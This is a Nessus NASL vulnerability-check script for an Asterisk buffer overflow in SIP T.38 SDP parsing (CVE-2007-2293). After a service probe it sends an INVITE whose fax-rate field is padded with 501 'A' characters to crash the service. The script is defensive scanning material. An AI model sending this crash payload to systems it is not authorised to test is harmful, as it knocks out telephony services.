#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(25671);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2007-2293");
  script_bugtraq_id(23648);
  script_xref(name:"OSVDB", value:"35368");

  script_name(english:"Asterisk SIP Channel T.38 SDP Parsing Multiple Buffer Overflows");
  script_summary(english:"Sends a special packet to Asterisk's SIP/SDP handler");

 script_set_attribute(attribute:"synopsis", value:
"The remote server is affected by two buffer overflow vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The version of Asterisk installed on the remote host contains two
stack-based buffer overflows in its SIP SDP handler when attempting to
read the 'T38FaxRateManagement:' and 'T38FaxUdpEC:' options in the SDP
within a SIP packet.  An unauthenticated remote attacker may be able
to leverage this flaw to execute code on the affected host subject to
the privileges under which Asterisk runs." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/472804/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://downloads.asterisk.org/pub/security/ASA-2007-010.html" );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/fulldisclosure/2007-04/0653.html" );
 script_set_attribute(attribute:"solution", value:
"Either disable T.38 support or upgrade to Asterisk 1.4.3 / AsteriskNow
Beta 6 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:H/Au:N/C:C/I:C/A:C" );
script_end_attributes();


  script_category(ACT_DENIAL);
  script_family(english:"Gain a shell remotely");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("sip_detection.nasl");
  script_require_keys("Services/udp/sip");

  exit(0);
}

port = get_kb_item("Services/udp/sip");
if (!port) port = 5060;


function sip_sendrecv(req)
{
  local_var res, soc;
  global_var port;

  if (isnull(req)) return NULL;

  if (islocalhost()) soc = open_sock_udp(port);
  else soc = open_priv_sock_udp(sport:5060, dport:port);
  if (!soc) return NULL;

  send(socket:soc, data:req);
  res = recv(socket:soc, length:1024);

  close(soc);

  return res;
}


# Make sure the service is up.
#
# nb: this is what's used in sip_detection.nasl.
probe = string(
  "OPTIONS sip:", get_host_name(), " SIP/2.0", "\r\n",
  "Via: SIP/2.0/UDP ", this_host(), ":", port, "\r\n",
  "Max-Forwards: 70\r\n",
  "To: <sip:", this_host(), ":", port, ">\r\n",
  "From: Nessus <sip:", this_host(), ":", port, ">\r\n",
  "Call-ID: ", rand(), "\r\n",
  "CSeq: 63104 OPTIONS\r\n",
  "Contact: <sip:", this_host(), ">\r\n",
  "Accept: application/sdp\r\n",
  "Content-Length: 0\r\n",
  "\r\n"
);
if (isnull(sip_sendrecv(req:probe))) exit(0);


# Try to crash the service.
sploit = string(
  "INVITE sip:200@", get_host_name(), " SIP/2.0", "\r\n",
  "Date: Wed, 21 Mar 2007 4:20:09 GMT\r\n",
  "CSeq: 1 INVITE\r\n",
  "Via: SIP/2.0/UDP ", this_host(), ":", port, ";branch=z9hG4bKfe06f452-2dd6-db11-6d02-000b7d0dc672;rport\r\n",
  "User-Agent: NGS/2.0\r\n",
  'From: "', SCRIPT_NAME, '" <sip:nessus@', this_host(), ":", port, ">;tag=de92d852-2dd6-db11-9d02-000b7d0dc672\r\n",
  "Call-ID: f897d952-2fa6-db49441-9d02-001b7d0dc672@nessus\r\n",
  "To: <sip:200@", get_host_name(), ":", port, ">\r\n",
  "Contact: <sip:nessus@", this_host(), ":", port, ";transport=udp>\r\n",
  "Allow: INVITE,ACK,OPTIONS,BYE,CANCEL,NOTIFY,REFER,MESSAGE\r\n",
  "Content-Type: application/sdp\r\n",
  "Content-Length: 796\r\n",
  "Max-Forwards: 70\r\n",
  "\r\n",
  "v=0\r\n",
  "o=rtp 1160124458839569000 160124458839569000 IN IP4 ", this_host(), "\r\n",
  "s=-\r\n",
  "c=IN IP4 ", get_host_ip(), "\r\n",
  "t=0 0\r\n",
  "m=image 5004 UDPTL t38\r\n",
  "a=T38FaxVersion:0\r\n",
  "a=T38MaxBitRate:14400\r\n",
  "a=T38FaxMaxBuffer:1024\r\n",
  "a=T38FaxMaxDatagram:238\r\n",
  "a=T38FaxRateManagement:", crap(data:"A", length:501), "\r\n",
  "a=T38FaxUdpEC:t38UDPRedundancy\r\n"
);
if (isnull(sip_sendrecv(req:sploit)))
{
  # There's a problem if the service is down now.
  #
  # nb: if asterisk was started via safe_asterisk, this check will fail
  #     since safe_asterisk will just respawn asterisk.
  if (isnull(sip_sendrecv(req:probe)))
    security_hole(port:port, proto:"udp");
}
